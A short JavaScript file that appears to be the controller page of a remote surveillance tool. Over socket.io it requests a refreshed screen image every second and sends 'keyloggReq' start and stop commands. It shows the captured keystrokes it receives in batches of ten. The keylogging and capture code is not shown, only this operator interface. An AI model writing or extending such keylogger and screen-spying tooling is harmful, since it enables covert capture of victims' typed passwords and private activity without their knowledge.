var ctx = document.getElementById("canvas")
var btn = document.getElementById("btn")
var keyl = document.getElementById("keys")
var add = document.getElementById("stdout")
var stopbtn = document.getElementById("stop")

const socket = io();
var i = 0;




btn.addEventListener('click', (e) => {
    setInterval(() => {
        socket.emit("request", "ye")
        ctx.src = "test.jpeg#" + i
        ctx.style = 'display:'
        i++


    }, 1000)
})
var keysR = []
keyl.addEventListener('click', (e) => {
    socket.emit("keyloggReq", "start")
    socket.on("keyRes", data => {
        keysR.push(data.key)
        if (keysR.length === 10) {

            keys(keysR)
            keysR = []
        }

    })
})
var submit = false
stopbtn.addEventListener('click', e => {
    submit = true
    socket.emit("keyloggReq","stop")
})
if(submit== true){
    console.log(submit)
}

function keys(data) {
    const div = document.createElement('div')

    div.classList.add('text-white')



    var p = document.createElement('p')
    p.classList.add('text-white')
    p.classList.add('mt-4')
    p.classList.add('ml-1')
    p.classList.add('text-center')


    p.textContent = data



    add.appendChild(p)

}